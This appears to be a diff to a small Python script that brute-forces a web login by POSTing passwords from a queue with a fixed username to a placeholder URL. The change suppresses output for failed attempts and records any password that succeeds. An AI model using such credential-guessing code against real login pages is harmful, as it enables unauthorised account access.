@@ -10,10 +10,13 @@ def Brute(q):
 		password = q.get()
 		username = 'username'
 		postrequest = r.post("http://url",data={'username':username,'password':password})
+		
 		if "Incorrect" in postrequest.text:
-			print(postrequest.text)
+			pass
+		
 		else:
 			print('Correct username and password '+username+' '+password)
+			correctpasswords.append(password)
 			break
 
 q1 = Queue()	
